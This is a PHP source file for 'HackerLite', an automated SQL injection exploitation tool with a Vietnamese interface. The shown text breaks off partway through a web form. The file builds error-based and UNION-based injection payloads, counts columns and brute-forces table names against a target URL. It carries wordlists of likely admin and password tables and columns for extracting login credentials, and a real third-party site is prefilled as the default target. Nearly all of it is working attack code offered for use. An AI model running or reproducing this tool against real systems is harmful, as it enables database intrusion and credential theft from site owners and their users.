<?php
	/*==Configs==*/
	//error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
	ini_set("output_buffering", "on");
	ini_set("implicit_flush", "on");
	ini_set("memory_limit", "32M");
	ini_set("max_execution_time", "360000");
	if(function_exists('set_time_limit')) @set_time_limit(60*60);
	//echo "<pre>";
	//var_dump($_POST);
	//echo "</pre>";
	/*===========*/
	/*===========*/
		if (isset($_GET['simg'])) ezimg::showImg($_GET['simg']);
	/*===========*/
	/*==Functions==*/
	 function GTableList(){
	 	return "\"table chứa danh sách databases, tables và columns...\n:*information_schema.columns\n"
					.">table_schema|table_name|column_name\n\n\"Các table chứa tên các tài khoản để đăng nhập\n"
					.":account|accounts|admin|admins|dangnhap|login|logins|nguoidung|nguoidungs|orders|quanly|quantri|taikhoan|taikhoanquantri|tb_account|tb_accounts|tb_admin|tb_admins|tb_login|tb_logins|tb_nguoidung|tb_nguoidungs|tb_user|tb_useraccount|tb_useraccounts|tb_users|tbaccount|tbaccounts|tbadmin|tbadmins|tbl_account|tbl_accounts|tbl_admin|tbl_admins|tbl_login|tbl_logins|tbl_nguoidung|tbl_nguoidungs|tbl_user|tbl_useraccount|tbl_useraccounts|tbl_users|tblaccount|tblaccounts|tbladmin|tbladmins|tbllogin|tbllogins|tblnguoidung|tblnguoidungs|tblogin|tblogins|tbluser|tbluseraccount|tbluseraccounts|tblusers|tbnguoidung|tbnguoidungs|tbuser|tbuseraccount|tbuseraccounts|tbusers|useraccount|useraccounts|users\n"
					.">|account_name|accountname|admin|adminname|aname|code|email|id|login|login_name|login_pas|login_pass|login_passwd|login_password|login_pwd|loginname|loginpas|loginpass|loginpasswd|loginpassword|loginpwd|matkhau|matma|name|nguoidung|nguoidungid|orderid|ordersid|pas|pass|pass_word|passwd|password|paswd|pwd|quanly|quantri|secret|secret_code|secretcode|ten|tendangnhap|tendn|tennd|tennguoidung|tenquanly|tenquantri|tukhoa|u_id|u_name|uid|uname|user|user_id|user_name|user_pass|user_passwd|user_password|user_pwd|userid|username|userpass|userpwd\n";
	 }
	 $cfm_dtpos = Array("open"=>";;@;vanhoa;@;","close" => ";;@;v4nh04;;@;");
 	 $m_get_html_translation_table=Array(
			'"' => '&quot;',
		  "'" => '&#39;',
		  '<' => '&lt;',
		  '>' => '&gt;',
		  '&' => '&amp;'
		);
		$html_title="HackerLite - SQL Injection Ver 1.03";
		$html_header="HackerLite Ver 1.03";
		if(!function_exists("m_htmlspecialchars_decode")){
		  function m_htmlspecialchars_decode($string,$style=ENT_COMPAT)
	    {
	    	global $m_get_html_translation_table;
        $translation = array_flip($m_get_html_translation_table);
        if($style === ENT_QUOTES){ $translation['&#039;'] = '\''; }
        return strtr($string,$translation);
	    }
	  }
		if(!function_exists("m_htmlspecialchars")){
		  function m_htmlspecialchars($string,$style=ENT_COMPAT)
	    {
	    	global $m_get_html_translation_table;
	    	$translation=$m_get_html_translation_table;
        if($style === ENT_QUOTES){ $translation['\''] = '&#039;'; }
        return strtr($string,$translation);
	    }
	  }
		/*<!-- Miscs */
		function InjectionGetData($s,$open,$close){
//			if (ereg ("(value (&apos;|'|\"))([^ ']*)((&apos;|'|\") to)", $s, $regs)) {
//				return $regs[3];
//			};
			if (ereg ("(".$open.")(.*)(".$close.")", $s, $regs)) {
				$s=$regs[2];
				while(ereg ("(.*)(".$close.")", $s, $regs)) $s=$regs[1];
				return $s;
			};
			return "";
		}
		function CheckEmpty($s,$s2){if($s=="") return ""; return $s2;}
		function RemoveScriptAndRefreshHeader($s) {return str_replace(array('<img','<form','<script','</script',"<meta",'http'),array('<simg','<div','<div style="display:none"','</div',"<unusetag",'#hxxp'),$s);}
		function PInvalid(){echo "<p class=error><b>Lỗi</b>:<i> tham số không hợp lệ!</i></p>";}
		function CharEncode($s,$concat){$r="";for($i=0;$i<strlen($s);$i++) {$r.="char(".ord($s[$i]."").")"; if($i+1!=strlen($s)) $r.=$concat;}; return $r;}
		function nstring($i){$ret="1";$j=2;while($j<=$i){$ret.=",".$j;$j++;};return $ret;}
		function showlistbox($_list,$_ident,$_listname){
			$_list=trim(str_replace($_ident,"\"",$_list),"\"");
			while($_list[strlen($_list)-1]=="\"") $_list=substr($_list,0,strlen($_list)-1);
			echo "<input type=text readonly style='width:60%;' onclick='this.select();return false;' value='".str_replace("\""," | ",$_list)."'> (&lt;-click để chọn)<br>";
				$_list=split("\"",$_list);$nmax=count($_list);$sz=min(10,$nmax);
			echo '<select name="'.$_listname.'" size='.$sz.' multiple onmousemove="ShowHelp(\''.((10<$nmax)?'Double click để thay đổi kích thước<br> (không hỗ trợ Opera)...':'').'\');return 0;" ondblclick="this.size=(this.size=='.$sz.')?'.$nmax.':'.$sz.';return false;">';
			for($i=0;$i<$nmax;$i++) echo '<option value="'.$_list[$i].'" '.($i==0?'SELECTED':'').'>'.$_list[$i];
			echo '</select> <br>';
		};
		function InString($s,$as){
			$s=strtoupper($s);
			if(!is_array($as)) $as=array($as);
			for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
			return false;
		}
		function _S_($s){return (stripslashes(trim(urldecode($s))));}
		function _S2_($s){return (addslashes($s));}
		function _S3_($s){return m_htmlspecialchars(trim($s));}
		function _S4_($s){return stripslashes(trim(m_htmlspecialchars_decode($s)));}
		function open_https_url($url,$refer = "",$usecookie = false) { 
    if ($usecookie) { 
        if (file_exists($usecookie)) { 
            if (!is_writable($usecookie)) { 
                return "Can't write to $usecookie cookie file, change file permission to 777 or remove read only for windows."; 
            } 
        } else { 
            $usecookie = "cookie.txt"; 
            if (!is_writable($usecookie)) { 
                return "Can't write to $usecookie cookie file, change file permission to 777 or remove read only for windows."; 
            } 
        } 
    } 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3"); 
    //Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3
    //User-Agent: Opera/9.23 (Windows NT 5.2; U; zh-cn)
		//User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.2) Gecko/20070219 Firefox/2.0.0.2
		//Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322)
    if ($usecookie) { 
        curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie); 
        curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);    
    } 
    if ($refer != "") { 
        curl_setopt($ch, CURLOPT_REFERER, $refer ); 
    } 
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
   	$result=curl_exec ($ch); 
   	curl_close ($ch); 
   	return $result; 
		}
		function DownloadSite($url)
		{
			$url=str_replace(Array(" ","+","'",'"'),Array("%20","%2b","%27","%22"),$url);
		  return open_https_url($url,$url);
		}
		//
		/* Miscs--> */
	function makecselect($cs){
		$o1=strpos($cs,"WHERE");
		return substr($cs,0,$o1);
	}
	function GetQueryString($p_s,$column,$columnlist,$table,$lastcolumn,$n,$scolumn)
	{
		$ss=split(";;",$p_s);$ss_len=count($ss);
		for($i=1;$i < $ss_len;$i++){
			$ss[$i]=split("[/][|]",$ss[$i]);
			if($ss[$i][0]=="COLLIST"){
				if($columnlist=="")
				{
					$ss[$i][0]=$ss[$i][1];
				}else{
					$ss[$i][0]=$ss[$i][2].str_replace("\"",$ss[$i][3],$columnlist).$ss[$i][4];
				}
			}
			$ss[0]=str_replace("{".$i."}",$ss[$i][0],$ss[0]);
		}
		$ret=$ss[0];
		$ret=preg_replace("/{{LC[|][|](.*?)[|][|]LC}}/",$lastcolumn==""?"":"$1",$ret);
		$ret=str_replace(
			Array("{SCOLUMN}","{COLUMN}","{TABLE}","{LASTCOLUMN}","{*n-1*}","{*n*}"),
			Array($scolumn   ,$column   ,$table   ,$lastcolumn   ,$n-1     ,$n     ),
			$ret);
		return $ret;
	}
	//echo GetQueryString($gcolumnstring[5],"col","col1;col2;col3","tab","col3",4);
		function loopstring($open,$middle,$close,$deti,$split){
			$ret="";
			if(is_array($middle)){
				$n=count($middle)-1;
				for($i=0;$i<=$n;$i++)
					$ret.=($open!=""?$open:"").$middle[$i].($close!=""?$close:"").(($i==$n)?"":($deti.$split.$deti));
			}else{
				$ret.=($open!=""?$open:"").$middle.($close!=""?$close:"");
			}
			return $ret;
		}
	function GetStringQuery($open,$middle,$close,$bieudienchuoi,$lienketchuoi,$useconvertisnull=true){
		//$bieudienchuoi:
		//  1 - Không mã hóa
		//  2 - Mã hóa bằng hàm char
		//$lienketchuoi:
		//  1 - Liên kết bằng hàm CONCATENATE với toán tử ||
		//  2 - Liên kết bằng toán tử +
		//  3 - Liên kết bằng hàm concat 
		if($middle<>""){
				switch($bieudienchuoi){
					case "1":
						switch($lienketchuoi){
							case "1":return ("CONCATENATE(".CheckEmpty($open,"'".$open."'||").loopstring("",$middle,"","||","' | '").CheckEmpty($close,"||'".$close."'").")");
							case "2":return ("(".CheckEmpty($open,"'".$open."'+").loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$middle,$useconvertisnull?",' '))":"","+","' | '").CheckEmpty($close,"+'".$close."'").")");
							case "3":return ("concat(".CheckEmpty($open,"'".$open."',").loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$middle,$useconvertisnull?",' '))":"",",","' | '").CheckEmpty($close,",'".$close."'").")");
							default:PInvalid();exit;
						};
						break;
					case "2":
						switch($lienketchuoi){
							case "1":return ("CONCATENATE(".CheckEmpty($open,CharEncode($open,"||")."||").loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$middle,$useconvertisnull?",char(32)))":"","||",CharEncode(" | ","||")).CheckEmpty($close,"||".CharEncode($close,"||")).")");
							case "2":return ("(".CheckEmpty($open,CharEncode($open,"+")."+").loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$middle,$useconvertisnull?",char(32)))":"","+",CharEncode(" | ","+")).CheckEmpty($close,"+".CharEncode($close,"+")).")");
							case "3":return ("concat(".CheckEmpty($open,CharEncode($open,",").",").loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$middle,$useconvertisnull?",char(32)))":"",",",CharEncode(" | ",",")).CheckEmpty($close,",".CharEncode($close,",")).")");
							default:PInvalid();exit;
						};
						break;
					default:PInvalid();exit;
				}
		}else	switch($bieudienchuoi){
			case "1":
				return "'".$open."'";
				break;
			case "2":
				switch($lienketchuoi){
					case "1":return ("CONCATENATE(".CharEncode($open,"||").")");
					case "2":return ("(".CharEncode($open,"+").")");
					case "3":return ("concat(".CharEncode($open,",").")");
					default:PInvalid();exit;
				};
				break;
			default:PInvalid();exit;
		}
	}
	function GetStringQuery2($a,$bieudienchuoi,$lienketchuoi,$useconvertisnull=true){
		return str_replace("++","+",GetStringQuery2b($a,$bieudienchuoi,$lienketchuoi,$useconvertisnull=true));
	}
	function GetStringQuery2b($a,$bieudienchuoi,$lienketchuoi,$useconvertisnull=true){
		if($a<>""){
				switch($bieudienchuoi){
					case "1":
						switch($lienketchuoi){
							case "1":return ("CONCATENATE(".loopstring("",$a,"","||","").")");
							case "2":return ("(".loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$a,$useconvertisnull?",' '))":"","+","").")");
							case "3":return ("concat(".loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$a,$useconvertisnull?",' '))":"",",","").")");
							default:PInvalid();exit;
						};
						break;
					case "2":
						switch($lienketchuoi){
							case "1":return ("CONCATENATE(".loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$a,$useconvertisnull?",char(32)))":"","||","").")");
							case "2":return ("(".loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$a,$useconvertisnull?",char(32)))":"","+","").")");
							case "3":return ("concat(".loopstring($useconvertisnull?"convert(varchar(256),isnull(":"",$a,$useconvertisnull?",char(32)))":"",",","").")");
							default:PInvalid();exit;
						};
						break;
					default:PInvalid();exit;
				}
		}else	switch($bieudienchuoi){
			case "1":
				return "'".$open."'";
				break;
			case "2":
				switch($lienketchuoi){
					case "1":return ("CONCATENATE(".CharEncode($open,"||").")");
					case "2":return ("(".CharEncode($open,"+").")");
					case "3":return ("concat(".CharEncode($open,",").")");
					default:PInvalid();exit;
				};
				break;
			default:PInvalid();exit;
		}
	}
	function GetColumnsList($columnname,$tablename,$url,$cselect,$bieudienchuoi,$lienketchuoi,$xs,$iway,$useconvertvarchar=true,$cond="1=1"){
		global $cfm_dtpos;
		$tp=$pt=0;while(false!==($tp=strpos($url,"=",$pt+1))) $pt=$tp;$murl=substr($url,0,$pt+1);
		while(1){
			$scolumn=GetStringQuery($cfm_dtpos["open"],"{COLUMN}",$cfm_dtpos["close"],$bieudienchuoi,$lienketchuoi,$useconvertvarchar);
			$qry=GetQueryString($cselect,$columnname,$columnlist,$tablename,$mlastcolumn,$n,$scolumn);
			$qry=str_replace("{COND}",$cond,$qry);
			$iurl=str_replace(Array("{URL}","{URLid}","{SQLCODE}"),Array($url,$murl,$qry),$iway).$xs;
			$s=DownloadSite($iurl);
			$lastcolumn2=$lastcolumn;
			$lastcolumn=InjectionGetData($s,$cfm_dtpos["open"],$cfm_dtpos["close"]);
			echo " ";
			if(trim($lastcolumn)==""||$lastcolumn2==$lastcolumn) break;
			$ret.=$lastcolumn."\"";
			$mlastcolumn=GetStringQuery($lastcolumn,"","",$bieudienchuoi,$lienketchuoi);
			$columnlist.=($columnlist<>""?"\"":"").$mlastcolumn;
			$n++;
		};
		//echo $iurl."<hr>".$s;
		return $ret;
	}
	function GDoQRY($columnname,$tablename,$url,$cselect,$bieudienchuoi,$lienketchuoi,$xs,$iway,$useconvertvarchar=true,$cond=""){
		global $cfm_dtpos;
		$tp=$pt=0;while(false!==($tp=strpos($url,"=",$pt+1))) $pt=$tp;$murl=substr($url,0,$pt+1);
    $cfm_dtpos = Array("open"=>$cfm_dtpos["open"]."| ","close" => $cfm_dtpos["close"]." |");
		$n=0;$columnlist="";$ret="";
		$scolumn=GetStringQuery($cfm_dtpos["open"],$columnname,$cfm_dtpos["close"],$bieudienchuoi,$lienketchuoi,$useconvertvarchar);
		$qry=GetQueryString($cselect,"col","",$tablename,"",0,$scolumn);
		if($cond) $qry.=" ".$cond;
		$iurl=str_replace(Array("{URL}","{URLid}","{SQLCODE}"),Array($url,$murl,$qry),$iway).$xs;
		return $iurl;
	}
	function DoQry($iurl,$istart,$istop,$cfm_dtpos_open,$cfm_dtpos_close,$strend){
		$istep=($istart<$istop)?1:-1;
		for($i=$istart;($i-$istop)*$istep<=0;$i+=$istep){
			$iurl2=str_replace("(\$_i_)",$i,$iurl);
			$s=DownloadSite($iurl2);
			$result=InjectionGetData($s,$cfm_dtpos_open,$cfm_dtpos_close);
			echo " ";
			if(trim($result)=="") continue;
			if($strend!="") if((strpos($result,$strend)!==false)) break;
			$ret.=$result."\n";
			$result="";
			$n++;
		};
		return $ret;
	}
	function form_hidden_param($arr)
	{
		foreach($arr as $elem)
			echo "<input type=hidden name='".$elem."' value='"._S3_($_POST[$elem])."'>\n";
		unset($elem);
		return "";
	}
	function DecodePostData()
	{
		global $_POST;
		foreach ($_POST as $_ename => $_eval) $_POST[$_ename]=_S4_($_eval);
		unset($_eval,$_ename);
	}
	function action_SQL_INJECTION()
	{
		$gcolumnstring=Array(
			"SELECT TOP 1 {SCOLUMN} FROM {TABLE} WHERE {COND} {{LC||and {COLUMN} not in({1})||LC}} ORDER BY {COLUMN};;COLLIST/|''/| /|,/| ",
			"SELECT TOP 1 {SCOLUMN} FROM {TABLE} WHERE {COND} {{LC||and {COLUMN} not in(SELECT TOP {*n-1*} {COLUMN} FROM {TABLE} ORDER BY {COLUMN})||LC}} ORDER BY {COLUMN}",
			"SELECT TOP 1 {SCOLUMN} FROM {TABLE} WHERE {COND} {1} ORDER BY {COLUMN};;COLLIST/|/|and {COLUMN}!=/| and  {COLUMN}!=/| ",
			"SELECT TOP 1 {SCOLUMN} FROM {TABLE} WHERE {COND} {{LC||and {COLUMN}>{LASTCOLUMN}||LC}} ORDER BY {COLUMN}",
			"SELECT TOP 1 {SCOLUMN} FROM {TABLE} WHERE {COND} ORDER BY {COLUMN} LIMIT {*n*},1",
		);
		$iwaystring=Array(
			Array("s"=>"{URL} and 1=convert(int,({SQLCODE}))","c"=>2),
			Array("s"=>"{URL}' and 1=convert(int,({SQLCODE}))","c"=>0),
			Array("s"=>'{URL}" and 1=convert(int,({SQLCODE}))',"c"=>0),
			Array("s"=>"{URLid}convert(int,({SQLCODE}))","c"=>0),
			Array("s"=>"{URL} {SQLCODE}","c"=>1),
			Array("s"=>"{URL}' {SQLCODE}","c"),
			Array("s"=>'{URL}" {SQLCODE}',"c"),
		);
		function urlstring($_url,$_urli,$_urlf,$_sql="{SQLCODE}"){
			return str_replace(
				Array("{URL}","{URLid}","{SQLCODE}"),
				Array($_url  ,$_urli   ,$_sql      ),
				$_urlf
			);
		}
		switch($_POST["step"]){
			case "buoc1":
				?>
				<form onSubmit="return false;" name="frm_sqlinjection1">
					<input TYPE=hidden NAME="step" VALUE="buoc2">
					Địa chỉ của site lỗi injection: <input name=url type=text value="http://www.sparkle.com.tw/product_detail.asp?id=57&sub_id=152"  style='width:60%;' ><br>
					<h4>Bạn hãy chọn cách querry:</h4>
					<?php echo form_hidden_param(Array("action")); ?>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="kieuquery" VALUE="1"         > <b>union select 1,2,3,... /* (MySql)</b><br>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="kieuquery" VALUE="2" checked > <b>convert(int,(select... --</b><br>
					<BR><input type=button onClick='DoSendRequest("sqlinjection1");return false;' value="Thực hiện">
				</form>
				<div name="div_sqlinjection1" id="div_sqlinjection1"></div>
				<?php
				break;
			case "buoc2-union1-countcolumn":
			case "buoc2-union1-checktables":
				echo "<script type=text/javascript language=JavaScript>
								document_loaded=false;
								function scrollauto(){
									document.body.scrollTop=document.body.scrollHeight;
									if(!document_loaded) setTimeout('scrollauto()',100);
								}
								setTimeout('scrollauto()',100);
							</script>";
			if($_POST["step"]=="buoc2-union1-checktables"){
				$gtables=str_replace("\r","\n",$_POST["gtables"]);
				$gtables=str_replace("\n\n","\n",$gtables);
				$gtables=trim($gtables);
				$gtables=split("\n",$gtables);
				$_gtables=Array();
				$_gtables["table"]=array();
				$_gtables["tblvip"]=array();
				$_gtables["column"]=array();
				$tcount=0;$b_cols=false;
				/**/
				for($i=0;$i<count($gtables);$i++){
					$g=trim($gtables[$i]);
					if($g[0]==":"){
						$g=str_replace("||","|",substr($g,1));
						$_gtables["table"][$tcount]=split("\|",$g);
						$_gtables["tblvip"][$tcount]=array();
						for($j=0;$j<count($_gtables["table"][$tcount]);$j++){
							if($_gtables["tblvip"][$tcount][$j]=($_gtables["table"][$tcount][$j][0]=="*")){
								$_gtables["table"][$tcount][$j]=substr($_gtables["table"][$tcount][$j],1);
							}
						}
						$b_cols=true;
					} else if($g[0]==">" && $b_cols) {
						$g=str_replace("||","|",substr($g,1));
						$_gtables["column"][$tcount]=split("\|",$g);
						$b_cols=false;
						$tcount++;
					}
				};
				/**/
				$kothaytable=str_replace("\r","\n",$_POST["kothaytable"]);
				$kothaytable=str_replace("\n\n","\n",$kothaytable);
				$kothaytable=trim($kothaytable);
				$kothaytable=split("\n",$kothaytable);
				$tablesresult=Array();$binfor=true;
				$kothaycolumn=Array();
				for($i=0;$i<count($kothaytable);$i++) $kothaycolumn[$i]=str_replace("table","column",$kothaytable);
				$columnsresult=Array();
				echo "<pre>";
				for($i=0;$i<count($_gtables["table"])&&$binfor;$i++){
					for($j=0;$j<count($_gtables["table"][$i])&&$binfor;$j++){
						echo "Đang kiểm tra table `".$_gtables["table"][$i][$j]."`... ";flush;
						$url=$_POST["url"]." union all select null from ".$_gtables["table"][$i][$j]." where 1=1".$_POST["suffix"];
						$s=DownloadSite($url);
							echo "==>";flush;
						if(!InString($s,$kothaytable)) {
							if($_gtables["tblvip"][$i][$j])	{
								$tablesresult=Array($_gtables["table"][$i][$j]);
								$binfor=false;
							}
							else
								$tablesresult[count($tablesresult)]=$_gtables["table"][$i][$j];
								$m=count($tablesresult)-1;
							$columnsresult[$m]=Array();
							echo " Chọn!!!\n";
							for($k=0;$k<count($_gtables["column"][$i]);$k++){
								echo " |_ Đang kiểm tra column `".$_gtables["column"][$i][$k]."`... ";flush;
								$url=$_POST["url"]." union all select ".$_gtables["column"][$i][$k]." from ".$_gtables["table"][$i][$j]." where 1=1".$_POST["suffix"];
								$s=DownloadSite($url);
								echo "==>";flush;
								if(!InString($s,$kothaycolumn)){
										echo " Chọn!!!\n";
										$columnsresult[$m][count($columnsresult[$m])]=$_gtables["column"][$i][$k];
								}else
										echo " Loại!\n";
								flush;
							}
						}else
							echo " Loại!\n";
						flush;
					}
				};
				echo "</pre>";
				/**/
			}else{
				$tablesresult=Array();
			}
				$saicolumns=str_replace("\r","\n",$_POST["saicolumns"]);
				$saicolumns=str_replace("\n\n","\n",$saicolumns);
				$saicolumns=trim($saicolumns);
				$saicolumns=split("\n",$saicolumns);
				$numcols=0;
				$cols="1";
				echo "<pre>";
				for($i=1;;$i++){
					$url=$_POST["url"]." union all select ".$cols.((count($tablesresult)>0)?(" from ".$tablesresult[0]." where 1=1"):"").$_POST["suffix"];
					echo "Số column là ".$i."?";flush;
					$s=DownloadSite($url);
					if(count($saicolumns)==0){
						for($j=1;$j<=$numcols;$j++) {if(strpos($s,"vh".$j."x")!==false) $b_iis=true;}
					}else	$b_iis=!InString($s,$saicolumns);
					echo " ==> ".($b_iis?"Đúng\n":"Sai\n");flush;
					if($b_iis){$numcols=$i;break;};
					$cols.=",1";
				}
				//if($_POST["step"]=="buoc2-union1-checktables" && count($tablesresult)>0){
					/*echo "Đang tìm các column có thể được sử dụng để khai thác...";flush;
					$cols="";for($i=1;$i<=$numcols;$i++) $cols.="concat('vh','".$i."','x')".($i==$numcols?"":",");
					$url=$_POST["url"]." union all select ".$cols.(count($tablesresult)>0?(" from ".$tablesresult[0]." where 1=1"):"").$_POST["suffix"];
					$s=DownloadSite($url)."<hr>";
					$cols="";
					for($i=1;$i<=$numcols;$i++) if(strpos($s,"vh".$i."x")!==false) $cols.=",$i";
					echo "OK";flush;*/
				//};
				$cols=substr($cols,1);
				echo "</pre>";
				echo "<script type=text/javascript language=JavaScript>
				document.body.innerHTML='Có ".$numcols." columns<br>&nbsp&nbsp".$_POST["url"]." union all select ".nstring($numcols).((count($tablesresult)>0)?(" from ".$tablesresult[0]):"").$_POST["suffix"]."<br>';";
				if($_POST["step"]=="buoc2-union1-checktables"){
					echo "document.body.innerHTML+='<br><u><b>Có ".count($tablesresult)." table được tìm thấy:</u></b><br>'";
					for($i=0;$i<count($tablesresult);$i++){
						echo "+'Table <b>".m_htmlspecialchars($tablesresult[$i])."</b>, có ".count($columnsresult[$i])." column tương ứng được tìm thấy trong danh sách:<br>'";
						echo "+'<list>'";
						for($j=0;$j<count($columnsresult[$i]);$j++){
							echo "+'<li> <i>".m_htmlspecialchars($columnsresult[$i][$j])."</i>'";
						}
						echo "+'</list>';";
					}
				}
				echo ";document_loaded=true;</script>";
				/**/
				unset($_gtables["table"],$_gtables["tblvip"],$_gtables["column"],$_gtables);
				break;
			case "buoc2":
				if($_POST["kieuquery"]==1){
					?>
						<form onSubmit="return false;" name="frm_sqlinjection1b">
							<input TYPE=hidden NAME="step" VALUE="buoc2-union1">
							<input TYPE=hidden NAME="iframe" VALUE="1">
							<?php echo form_hidden_param(Array("url","action","kieuquery")); ?>
							<h4>Danh sách table và column để thử:</h4>
							<font size=-1>
								<list>
									<li>Danh sách table và danh sách column được phân cách bởi dấu <font color=red>|</font>.
									<li>Các table hoặc column <b>quan trọng</b> được thêm ký tự <font color=red>*</font> vào trước.<br>
										&nbsp;<i><u>Các table quan trọng</u> sẽ là các table được ghi ra ngay <b>một cách duy nhất</b> khi tìm thấy mà không cần thử các table khác trong danh sách bạn nhập</i>.
									<li>Ghi danh sách columns sẽ thử nếu table đó tồn tại vào <b>dòng tiếp theo</b> của dòng ghi tên table có table đó.</li>
									<li>Bắt đầu một dòng bởi <font color=red>"</font> (dấu ngoặc kép),<font color=red>:</font> (dấu hai chấm),<font color=red>&gt;</font> (dấu lớn hơn) để biểu thị lần lượt dòng đó là ghi chú, ghi tên table hay ghi tên column.</li>
								</list>
							</font><br>
							<?php echo form_hidden_param(Array("action")); ?>
							<textarea name=gtables rows=10 style="width:80%;overflow:scroll;"><?php echo GTableList();?></textarea>  
							<h4>Các chuỗi để so sánh:</h4>
							<font size=1>(Mỗi chuỗi một dòng)</font><br>
							Không tìm thấy table vừa nhập:<br> <textarea name=kothaytable style="width:80%;overflow:scroll;" rows=3 >cannot find the input table<?php echo "\n";?>Unknown table<?php echo "\n";?>doesn't exist<?php echo "\n";?>Could not find file</textarea><br>
							Số lượng columns không phù hợp:<br> <textarea name=saicolumns style="width:80%;overflow:scroll;" rows=3 >The number of columns in the two selected tables or queries of a union query do not match.<?php echo "\n";?>The used SELECT statements have a different number of columns<?php echo "\n";?>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists</textarea><br>
							Xâu thêm vào phía sau query:<input type=text name=suffix value="/*" style='width:10%;'><br>
							<BR><input type=button onClick='iDoSendRequest("sqlinjection1b","sqlinjection1b","buoc2-union1-checktables");return false;' value="Bắt đầu tìm table (hack kiểu jet)">
							 <input type=button onClick='iDoSendRequest("sqlinjection1b","sqlinjection1b","buoc2-union1-countcolumn");return false;' value="Đếm số columns không cần biết table">
						</form>
						<div name="div_sqlinjection1b" id="div_sqlinjection1b"></div>
					<?php
					break;
				}
				/*if($_POST["kieuquery"]==1 && !$_POST["nmax"])
				{
					$i=1;$j=1;$k=0;$url=$_POST["url"];$url2="";
					$s='';$s2='';$c='';
					//echo "Đang thử column thứ 1<br>";
					$s=DownloadSite($url . " union all select 1/*" . $url2);
					$s4=str_replace("union all select 1/*","",$s);
					$qrst="char(168)";
					$mnstring=$qrst;
					while(true){
						$j++;
						//echo "Đang thử column thứ ".$j."<br>";
						echo " ";
						if($j>1000) {
							echo "Quá nhiều lần thử... Bó tay...<br>";
							exit();
						}
						$mxurl= " union all select ".$mnstring."/*" ;
						$s2=DownloadSite($url .$mxurl. $url2);
						//$s3=str_replace(nstring($j),"",$s2);
						//if(strlen($s4)!=strlen($s3)) break;
						if(strpos($s2,"mysql_fetch_array")===false) break;
						$mnstring+=",".$qrst;
					};
					$s2=DownloadSite($url .nstring($j). $url2);
					$i=$j;$s2=RemoveScriptAndRefreshHeader($s2);
					echo "<div width=100% style='height:200px;margin:5px; padding: 5px;border:dotted 1 blue;overflow: scroll;'>".$s2."</div>";
					?>
						<form onSubmit="return false;" name="frm_sqlinjection2_a">
							<input TYPE=hidden NAME="step" VALUE="buoc2">
							<input TYPE=hidden NAME="nmax" VALUE="<?php echo $i; ?>">
							<?php echo form_hidden_param(Array("url","action","kieuquery")); ?>
							Bạn hãy nhập một số nguyên mà bạn thấy ở trên (khoảng từ 1 đến <?php echo $i; ?>) để khai thác:
							<input type=text name=n value='1'>
							<br><input type=button onClick='DoSendRequest("sqlinjection2_a");return false;' value="Tùy chọn">
						</form>
						<div name="div_sqlinjection2_a" id="div_sqlinjection2_a"></div>
					<?php
					break;
				};*/
				$url=$_POST["url"];$tp=$pt=0;while(false!==($tp=strpos($url,"=",$pt+1))) $pt=$tp;$urlid=substr($url,0,$pt+1);
				$c=$d="";$n=$_POST["n"]+0;$nmax=$_POST["nmax"];
				for($i=1;$i<$n;$i++) $c.=$i.",";
				for($i=$n+1;$i<=$nmax;$i++) $d.=",".$i;
				?>
				<form onSubmit="return false;" name="frm_sqlinjection2">
					<input TYPE=hidden NAME="step" VALUE="buoc3">
					<?php echo form_hidden_param(Array("url","action","kieuquery")); ?>
					Bạn hãy chọn các tùy chọn cho việc khai thác lỗi sql injection của <?php echo _S3_($_POST["url"]); ?>
					<h4>Cách biểu diễn chuỗi:</h4>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="bieudienchuoi" VALUE="1" <?php if($_POST["kieuquery"]==1)echo "checked" ?> > Không mã hóa <i>(VD: chuỗi <b>'abc'</b> được để nguyên là <b>'abc'</b> trong query)</i><br>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="bieudienchuoi" VALUE="2" <?php if($_POST["kieuquery"]==2)echo "checked" ?> > Mã hóa bằng hàm char <i></i><br>
					<!--<INPUT TYPE=RADIO CLASS=checkbox NAME="bieudienchuoi" VALUE="3"> Mã hóa bằng hàm chr <i></i><br>-->
					<h4>Cách liên kết chuỗi:</h4>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="lienketchuoi" VALUE="1"					> Liên kết bằng hàm CONCATENATE với toán tử || <i>(VD: <b>'abc'</b> sẽ được chuyển thành <b>CONCATENATE('a'||'b'||'c')</b>)</i> (Oracle)<br>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="lienketchuoi" VALUE="2" <?php if($_POST["kieuquery"]==2)echo "checked" ?> > Liên kết bằng toán tử + <i>(VD: <b>'abc'</b> sẽ được chuyển thành <b>char(97)+char(98)+char(99)</b>)</i><br>
